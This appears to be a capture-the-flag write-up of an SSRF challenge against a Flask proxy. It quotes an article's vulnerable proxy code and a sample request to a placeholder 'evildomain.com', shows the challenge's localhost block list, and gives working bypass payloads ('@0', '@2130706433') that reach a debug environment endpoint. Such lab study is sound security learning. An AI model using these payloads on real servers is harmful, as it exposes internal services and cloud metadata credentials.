---
title: "Proxy Pwn Challenge"
date: 2024-05-21
---


Resources 
- https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
# Flask Proxy

A snippet taken straight from the article shows us this

> [!NOTE]
> *My first thought was: "What if the developer forgets to add the last slash in the `SITE_NAME` variable?". And yes, it can lead to an SSRF.*
> 
> *Since Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.*
> 
> *Please consider the following source code as a reference for the exploitation scenario:*
> 
> ```
> from flask import Flask
> from requests import get
> 
> app = Flask('__main__')
> SITE_NAME = 'https://google.com'
> 
> @app.route('/', defaults={'path': ''})
> @app.route('/<path:path>')
> 
> def proxy(path):
>   return get(f'{SITE_NAME}{path}').content
> 
> if __name__ == "__main__":
>     app.run(threaded=False)
> ```
> 
> *Presented below is an example of an exploitation request:*
> 
> 
> ```
> GET @evildomain.com/ HTTP/1.1
> Host: target.com
> Connection: close
> ```
> 
> *In the following example, I was able to fetch my EC2 metadata:*
> 

# Let's give it a whirl shall we?

Looking at the code we clearly need to reach the `/enviroment` endpoint and it looks to be at the `/debug` route. 

```
GET /?url=@127.0.0.1:1337/debug/environment
```

result

```
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/3.0.0 Python/3.12.0
Date: Wed, 22 May 2024 04:17:03 GMT
Content-Type: application/json
Content-Length: 24
Connection: close

{"error":"Not Allowed"}
```

As we can see this did not work so searching through the provided files we can see this.

```python
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

```

## SSRF URL ByPass

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass

From this we can try replacing `127.0.0.1` with any of the payloads. Let's try `@0`

```
GET /?url=@0:1337/debug/environment 
```


![[Assets/Pasted image 20240521230536.png]]

## PS
Another cool one that worked was 
```
GET /?url=@2130706433:1337/debug/environment
```
